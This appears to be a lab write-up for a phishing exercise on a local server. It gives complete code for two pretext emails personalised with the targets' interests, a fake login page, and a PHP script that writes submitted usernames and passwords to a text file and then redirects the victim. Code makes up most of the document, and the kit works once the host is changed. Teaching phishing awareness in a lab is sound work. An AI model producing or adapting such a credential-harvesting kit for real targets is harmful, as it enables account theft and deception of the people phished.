## Objective
> 
> The objective of this exercise is to create a phishing email and a fake login page to capture login credentials for educational purposes. The exercise includes:
> 
> - Crafting phishing emails for two targets: Bob and Alice.
> - Creating a fake login page.
> - Setting up a PHP script to harvest login credentials.
> - Testing the setup using a local server (XAMPP).

---
## Final Files
> 
> - `Bob_Phishing.html`: Phishing email for Bob.
> - `Alice_Phishing.html`: Phishing email for Alice.
> - `fake_login.html`: Fake login page.
> - `style.css`: CSS file for styling the login page.
> - `harvest_data.php`: PHP script to harvest login credentials.
> - `credentials.txt`: File to store harvested credentials.

---
## Steps to Set Up and Run the Exercise
> 
> #### Step 1: Set Up Local Server (XAMPP)
> 
> - **Download and Install XAMPP**:
>     
>     - Go to the XAMPP website and download XAMPP.
>     - Install XAMPP on your machine.
> - **Start Apache Server**:
>     
>     - Open the XAMPP Control Panel.
>     - Start the Apache server.
> ---
> #### Step 2: Organize Your Files
> 
> - **Create Project Folder**:
>     
>     - Navigate to the `htdocs` directory inside your XAMPP installation (e.g., `C:\xampp\htdocs`).
>     - Create a new folder named `phishing_project`.
> - **Place Files in Project Folder**:
>     
>     - Copy the following files into the `phishing_project` folder:
>         1. `Bob_Phishing.html`
>         2. `Alice_Phishing.html`
>         3. `fake_login.html`
>         4. `style.css`
>         5. `harvest_data.php`
>         6. `credentials.txt`
> ---
> #### Step 3: Review and Adjust Files
> 
> 1. **Bob_Phishing.html**:
> ```html
> <!DOCTYPE html>
> <html lang="en">
> <head>
>     <meta charset="UTF-8">
>     <meta name="viewport" content="width=device-width, initial-scale=1.0">
>     <title>Special Offer for Shimi!</title>
>     <style>
>         body {
>             font-family: Arial, sans-serif;
>             background-color: #f4f4f4;
>             margin: 0;
>             padding: 0;
>         }
>         .email-container {
>             background-color: #ffffff;
>             width: 80%;
>             margin: 20px auto;
>             padding: 20px;
>             border: 1px solid #dddddd;
>             box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
>         }
>         .header {
>             background-color: #007bff;
>             color: white;
>             padding: 10px;
>             text-align: center;
>         }
>         .content {
>             margin: 20px 0;
>         }
>         .button {
>             background-color: #007bff;
>             color: white;
>             padding: 10px 20px;
>             text-decoration: none;
>             display: inline-block;
>             margin: 20px 0;
>         }
>     </style>
> </head>
> <body>
>     <div class="email-container">
>         <div class="header">
>             <h1>Special Offer for Shimi!</h1>
>         </div>
>         <div class="content">
>             <p>Hi Bob,</p>
>             <p>We know how much you love your dog Shimi, and we have an exclusive offer just for you!</p>
>             <p>Click the button below to claim your discount on the best dog products available.</p>
>             <a href="http://localhost/phishing_project/fake_login.html" class="button">Claim Your Offer</a>
>         </div>
>     </div>
> </body>
> </html>
> 
> ```
> 
> 2. **Alice_Phishing.html**:
> ```html
> <!DOCTYPE html>
> <html lang="en">
> <head>
>     <meta charset="UTF-8">
>     <meta name="viewport" content="width=device-width, initial-scale=1.0">
>     <title>Exclusive Vintage Car Show Invitation</title>
>     <style>
>         body {
>             font-family: Arial, sans-serif;
>             background-color: #f4f4f4;
>             margin: 0;
>             padding: 0;
>         }
>         .email-container {
>             background-color: #ffffff;
>             width: 80%;
>             margin: 20px auto;
>             padding: 20px;
>             border: 1px solid #dddddd;
>             box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
>         }
>         .header {
>             background-color: #28a745;
>             color: white;
>             padding: 10px;
>             text-align: center;
>         }
>         .content {
>             margin: 20px 0;
>         }
>         .button {
>             background-color: #28a745;
>             color: white;
>             padding: 10px 20px;
>             text-decoration: none;
>             display: inline-block;
>             margin: 20px 0;
>         }
>     </style>
> </head>
> <body>
>     <div class="email-container">
>         <div class="header">
>             <h1>Exclusive Vintage Car Show Invitation</h1>
>         </div>
>         <div class="content">
>             <p>Hi Alice,</p>
>             <p>We are thrilled to invite you to an exclusive vintage car show. As a fan of classic cars, this is an event you won't want to miss!</p>
>             <p>Click the button below to confirm your attendance and receive all the details.</p>
>             <a href="http://localhost/phishing_project/fake_login.html" class="button">Confirm Attendance</a>
>         </div>
>     </div>
> </body>
> </html>
> 
> ```
> 
> 3. **fake_login.html**:
> ```html
> <!DOCTYPE html>
> <html lang="en">
> <head>
>     <meta charset="UTF-8">
>     <meta name="viewport" content="width=device-width, initial-scale=1.0">
>     <title>Fake_Login</title>
>     <link rel="stylesheet" href="style.css">
> </head>
> <body>
>     <div class="login-container">
>         <h1>Login plz</h1>
>         <form action="harvest_data.php" method="post">
>             <input type="text" name="username" placeholder="Username" required>
>             <input type="password" name="password" placeholder="Password" required>
>             <button type="submit">Login</button>
>         </form>
>     </div>
> </body>
> </html>
> 
> ```
> 
> 4. **style.css**:
> ```css
> body {
>     font-family: Arial, sans-serif;
>     background-color: #f4f4f4;
>     display: flex;
>     justify-content: center;
>     align-items: center;
>     height: 100vh;
>     margin: 0;
> }
> .login-container {
>     background-color: #ffffff;
>     padding: 20px;
>     border: 1px solid #dddddd;
>     box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
>     width: 300px;
>     text-align: center;
> }
> .login-container h1 {
>     margin-bottom: 20px;
>     color: #333333;
> }
> .login-container input {
>     width: 90%;
>     padding: 10px;
>     margin: 10px 0;
>     border: 1px solid #dddddd;
>     border-radius: 5px;
>     color: #555555;
> }
> .login-container button {
>     background-color: #007bff;
>     color: white;
>     padding: 10px 20px;
>     border: none;
>     border-radius: 5px;
>     cursor: pointer;
> }
> .login-container button:hover {
>     background-color: #0056b3;
> }
> 
> ```
> 
> 5. **harvest_data.php**:
> ```php
> <?php
> if ($_SERVER["REQUEST_METHOD"] == "POST") {
>     $username = $_POST['username'];
>     $password = $_POST['password'];
>     
>     // Append the captured data to a file
>     $file = fopen("credentials.txt", "a");
>     fwrite($file, "Username: $username, Password: $password\n");
>     fclose($file);
>     
>     // Redirect to a legitimate page or a "login failed" page
>     header("Location: https://example.com/login"); // Change to a real page if needed
>     exit();
> }
> ?>
> 
> ```
> 
> 6. **credentials.txt**:
>     - This file will store the harvested credentials.
> ---
> #### Step 4: Test the Setup
> 
> 1. **Open Phishing Emails in Browser**:
>     
>     - Open `Bob_Phishing.html` and `Alice_Phishing.html` in your browser.
> 2. **Click the Link in the Phishing Email**:
>     
>     - Click the button/link in the phishing email to navigate to the fake login page.
> 3. **Submit Credentials**:
>     
>     - Enter sample credentials on the fake login page and submit.
> 4. **Verify Data Capture**:
>     
>     - Open `credentials.txt` in the `phishing_project` folder to verify that the credentials have been captured correctly.

---
## Conclusion

This exercise demonstrates how to create and test a phishing attack in a controlled environment. The files and steps outlined here are for educational purposes only and should not be used for any malicious activities.